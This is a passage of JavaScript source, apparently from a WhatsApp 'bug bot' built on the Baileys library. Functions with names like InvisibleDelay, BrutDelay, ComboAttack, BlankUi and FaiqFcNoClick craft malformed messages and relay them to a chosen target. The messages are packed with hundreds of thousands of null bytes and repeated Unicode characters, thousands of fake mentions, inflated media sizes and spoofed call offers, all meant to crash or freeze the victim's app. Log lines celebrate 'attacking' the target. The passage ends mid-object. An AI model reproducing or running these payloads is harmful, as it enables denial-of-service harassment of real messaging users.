            interactiveResponseMessage: {
              body: {
                text: "| ⛧ 𝐗-𝐂𝐎𝐑𝐄 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⛧ |",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: JSON.stringify({
                  status: true,
                }),
                messageParamsJson: "{".repeat(10000),
                version: 3,
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(Crash.to, Crash.message);

    const Sticker = {
      key: {
        remoteJid: target,
        fromMe: true,
      },
      message: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "⛧ 𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 • 𝐗-𝐂𝐎𝐑𝐄 ⛧",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: JSON.stringify({
                  status: true,
                  heavy: "꧔꧈".repeat(5000),
                  junk: "\u0000".repeat(2000),
                }),
                version: 3,
              },
            },
          },
        },
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQORtpkR3iLUpH0ee7oy4f2puj-uek0FvQYY0xBlgaEZnaBWR5v7GWVpu25JIAlqQNr_UA30CCXYtdwtz6kvhRwOGEt5mJjfGoha0044vQ?ccb=9-4&oh=01_Q5Aa2AEfCOra8YBqZG62qUTtomltzEL36xSuzDAUIiSXTQXVLg&oe=68AA21E7&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "5Wd8J7jkKen7rKKcT4JhWMuqXqO8i34y7VCkLoauBwM=",
          fileEncSha256: "yEsA5CPg4pRyJnKIQhyK/kqXwqL6yhIO82rgYuDX0p4=",
          mediaKey: "sDWCGbVe8fB+5Nh5QaSNrSdGJJX5kqSrTnKnU1w40CM=",
          mimetype: "image/webp",
          directPath:
            "/o1/v/t24/f2/m238/AQORtpkR3iLUpH0ee7oy4f2puj-uek0FvQYY0xBlgaEZnaBWR5v7GWVpu25JIAlqQNr_UA30CCXYtdwtz6kvhRwOGEt5mJjfGoha0044vQ?ccb=9-4&oh=01_Q5Aa2AEfCOra8YBqZG62qUTtomltzEL36xSuzDAUIiSXTQXVLg&oe=68AA21E7&_nc_sid=e6ed6c",
          fileLength: "249831",
          mediaKeyTimestamp: "1753394546",
        },
        extendedTextMessage: {
          text: "⛧ 𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 • 𝐗-𝐂𝐎𝐑𝐄 ⛧",
          mentionedJid: Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
        },
      },
    };

    await sock.relayMessage(target, Sticker.message);
  } catch (err) {
    console.error("Poseidon error:", err);
  }
}

async function InvisibleDelay(sock, jid) {
const buttons = [
{ buttonId: "\u0000".repeat(299999), buttonText: { displayText: "</> Stectre-X Avliable." }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: '</> Stectre-X Avliable.' }, 
type: 1, 
nativeFlowInfo: { 
name: 'Exploit Injection',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(220000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 2 
}
}
];
let messagePayload = {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"caption": "</> izii Avliable." + "\u0000".repeat(199) + "ꦾ".repeat(15999), 
"fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
"fileLength": "99999999999",
"height": 307,
"width": 734,
"mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
"fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
"directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1738686532",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
"scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
"scanLengths": [
2226,
6362,
4102,
6420
],
"midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 
contextInfo: {
virtexId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: [jid, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "⌁⃰⃟༑".repeat(99),
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "</> Stectre-X Avliable."
},
hasMediaAttachment: true,
contentText: "</> Stectre-X Avliable.",
footerText: "Why?",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}, 
isForwarded: true,
actionLink: {
url: "t.me/kyysofhopee", //jangan diganti
buttonTitle: "Σ⃟༑"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
serverMessageId: 1,
newsletterName: `</> Stectre-X Avliable.${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "Hey, your words were really scary."
}
}
}
}
}
};
await sock.relayMessage(jid, messagePayload, {
messageId: sock.generateMessageTag(), 
participant: { jid : jid }
});
}

async function trashprotocol(target, mention) {
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@YanzxJawa",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({ 
                        title: "꧀".repeat(9741),
                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗̸̷̷̷̋͜͢͜͢͠͡͡𝐕𝐄𝐋𝐙-‣"
                        }
                    },
                    description: "𐌓𐌉𐌆𐌗𐌅𐌄𐌋𐌆 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "false" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function DelayOs(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "</.سيكس>",
            format: "DEFAULT",
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 16777215)
                .toString(16)
                .padStart(6, "0")
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(559919),
            version: 3,
            entryPointConversionSource: "call_permission_message"
          }
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, message, {
    userJid: sock.user.id
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function DelayInvisV1(sock, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "\u0000".repeat(10000),
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,

      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1950 }, () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",

        quotedMessage: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0000".repeat(10000),
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\u0000".repeat(10000),
                  version: 3,
                },
              },
            },
          },
        },
      },
    },

    nativeFlowMessage: {
      messageParamsJson: "\u0000".repeat(10000),
    },
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }],
          },
        ],
      },
    ],
  });

  console.log(chalk.red("Succesfully Attack Target By : @YanzxJawa"));
}

async function BrutDelay(sock, target) {
  
  const payload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Cihuy" + "\u0000".repeat(2000),
            format: "DEFAULT"
          },

          nativeFlowResponseMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: "\u0000".repeat(2000)
              },
              {
                name: "payment_info",
                buttonParamsJson: "\u0000".repeat(2000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(2000),
                version: 3
              }
            ],

            messageParamsJson: "\u0000".repeat(2000)
          },

          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ]
          }
        },

        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),

        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0")
      }
    }
  };

  // 🔧 Perbaikan UTAMA: variabel tidak boleh ada tanda minus(-)
  const Stectre_XMsg = await generateWAMessageFromContent(target, payload, {});

  await sock.relayMessage(
    target,
    Stectre_XMsg.message,
    { messageId: Stectre_XMsg.key.id }
  );
}

async function NotifUI(target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: " " },
            body: { text: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(20000),
                    id: "ok_btn"
                  })
                }
              ]
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function ForceClick(sock, target) {
  try {
    const zieeMsg = {
      remoteJid: "X",
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: Math.floor(Math.random() * 3) + 1,
          expiryTimestamp: Date.now() + 1814400000
        }
      }
    }

    const duarr = {
      viewOnceMessageV2: {
        message: {
          extendedTextMessage: {
            text: "Stectre-X Clik Me",
            contextInfo: zieeMsg
          }
        }
      }
    }
    const msg1 = generateWAMessageFromContent(target, duarr, {})
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id })

    await new Promise(r => setTimeout(r, 300))

    const duarrrr = {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: "‎",
          hydratedFooterText: " ",
          hydratedButtons: [
            { index: 1, urlButton: { displayText: "‎", url: "http://t.me/pherine"+"...".repeat(500) } }
          ],
          contextInfo: {
            remoteJid: "X",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
    const msg2 = generateWAMessageFromContent(target, duarrrr, {})
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id })
  } catch (e) {}
}

async function ComboAttack(sock, target) {
  try {
    const delay = (ms) => new Promise(res => setTimeout(res, ms));

    for (let i = 1; i <= 50; i++) {

      const Reoclint = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1800 },
          () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")
      ];

      await sock.relayMessage(target, {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1234567891234@newsletter",
            newsletterName: "ϟ-£Rîēdz. Ēksò4!x¿𖣂?",
            caption: "I Am Tired",
            inviteExpiration: Date.now() + 90000,
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: Reoclint,
              stanzaId: "123" + Date.now()
            }
          }
        }
      }, { messageId: "BLANK_" + i });

      console.log(`Loh Awas${i}`);
      await delay(350);
    }

    await sock.relayMessage(target, {
      message: {
        groupInviteMessage: {
          groupJid: "1975@g.us",
          inviteCode: "ꦽ".repeat(3000),
          inviteExpiration: Date.now() + 999999999,
          groupName: "\u200B" + "ꦾ".repeat(1500),
          caption: "R" + "ꦾ".repeat(800),
          body: { text: "Always Solo Only" + "ꦽ".repeat(2000) }
        }
      }
    });

    await sock.relayMessage(target, {
      message: {
        interactiveMessage: {
          body: { text: "\u200B".repeat(1000) + "Вы готовы?" },
          nativeFlowMessage: {
            buttons: [
              { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Продолжить", id: "NEXT" }) }
            ]
          }
        }
      }
    });

    await sock.relayMessage(target, {
      message: {
        callMessage: {
          callId: "CALL_" + Date.now(),
          callType: "video",
          label: "Входящий видеозвонок",
          status: "ONGOING"
        }
      }
    });

    await sock.sendNode({
      tag: "message",
      attrs: { to: target, id: sock.generateMessageTag() },
      content: [
        {
          tag: "call_log_message",
          attrs: {
            callId: "CALL_",
            callType: "video",
            status: "missed",
            label: "XxX" + "\u200B".repeat(4000)
          }
        },
        {
          tag: "group_invite_message",
          attrs: {
            jid: "1975@g.us",
            invite_code: "ARCABOUTYOU",
            group_name: "XxX | Message",
            caption: "ꦽꦽꦽꦽ".repeat(1500)
          }
        }
      ]
    });

    console.log(`Успех комбоатаки: ${target}`);

  } catch (err) {
    console.error("Ошибка комбоатаки:", err);
  }
}

async function NotifUI(target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: " " },
            body: { text: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(20000),
                    id: "ok_btn"
                  })
                }
              ]
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function callInvis(target, mention) {
  let hell = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xatanical",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await sock.relayMessage("status@broadcast", hell.message, {
    messageId: hell.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: hell.key,
          type: 25
        }
      }
    }
  },
  {
    additionalNodes: [{
      tag: "meta",
      attrs: { is_status_mention: "true" },
      content: undefined
    }]
  });
      
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 400,
                },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
  console.log(chalk.red('Send Bug sukses')) 
}


async function BlankUi(target) {
  const Bella = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
              directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
              mimetype: "image/jpeg",
              width: 99999999999999,
              height: 99999999999999,
              fileLength: 9999999999999,
              fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
              fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
              mediaKeyTimestamp: 1753804634,
              mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            }
          },
          body: { 
            text: "Assalamualaikum Join Channel Ku Bang" + "ꦽ".repeat(50000),
          },
          contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 700 }, () =>
            "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
          )
        ]
      },
          nativeFlowMessage: {            
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              }
            ],
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, Bella, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}


async function FaiqFcNoClick(target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let ZayCoreX = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: '🩸Faiq Crash '
                    },
                    footer: {
                        text: '🩸Faiq Crash '
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
